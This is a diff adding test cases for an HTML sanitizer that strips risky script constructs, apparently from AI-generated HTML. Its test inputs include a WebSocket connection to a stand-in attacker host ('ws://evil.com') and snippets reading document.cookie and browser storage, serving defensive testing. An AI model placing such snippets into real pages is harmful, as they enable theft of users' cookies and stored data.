@@ -122,4 +122,54 @@ describe('HTML Sanitizer (Phase 1 Fix)', () => {
     expect(result.sanitized).toContain('<!DOCTYPE html>');
     expect(result.sanitized).not.toContain('```');
   });
+
+  it('should remove setTimeout with string arguments', () => {
+    const html = '<!DOCTYPE html><html><body><script>setTimeout("alert(1)", 100)</script></body></html>';
+    const result = sanitizeHtml(html);
+    expect(result.issues).toContain('Removed setTimeout/setInterval with string arguments');
+  });
+
+  it('should remove XMLHttpRequest', () => {
+    const html = '<!DOCTYPE html><html><body><script>new XMLHttpRequest()</script></body></html>';
+    const result = sanitizeHtml(html);
+    expect(result.issues).toContain('Removed XMLHttpRequest usage');
+  });
+
+  it('should remove WebSocket', () => {
+    const html = '<!DOCTYPE html><html><body><script>new WebSocket("ws://evil.com")</script></body></html>';
+    const result = sanitizeHtml(html);
+    expect(result.issues).toContain('Removed WebSocket usage');
+  });
+
+  it('should remove document.cookie access', () => {
+    const html = '<!DOCTYPE html><html><body><script>var x = document.cookie</script></body></html>';
+    const result = sanitizeHtml(html);
+    expect(result.issues).toContain('Removed document.cookie access');
+  });
+
+  it('should remove localStorage access', () => {
+    const html = '<!DOCTYPE html><html><body><script>localStorage.getItem("x")</script></body></html>';
+    const result = sanitizeHtml(html);
+    expect(result.issues).toContain('Removed localStorage access');
+  });
+
+  it('should remove sessionStorage access', () => {
+    const html = '<!DOCTYPE html><html><body><script>sessionStorage.setItem("x","y")</script></body></html>';
+    const result = sanitizeHtml(html);
+    expect(result.issues).toContain('Removed sessionStorage access');
+  });
+
+  it('should allow local /lib/ path scripts', () => {
+    const html = '<!DOCTYPE html><html><body><script src="/lib/orbit-controls.js"></script></body></html>';
+    const result = sanitizeHtml(html);
+    expect(result.sanitized).toContain('/lib/orbit-controls.js');
+    expect(result.issues.some(i => i.includes('blocked'))).toBe(false);
+  });
+
+  it('should strip <think> blocks from AI output', () => {
+    const html = '<think>reasoning here</think><!DOCTYPE html><html><body>clean</body></html>';
+    const result = sanitizeHtml(html);
+    expect(result.sanitized).not.toContain('<think>');
+    expect(result.sanitized).toContain('<!DOCTYPE html>');
+  });
 });
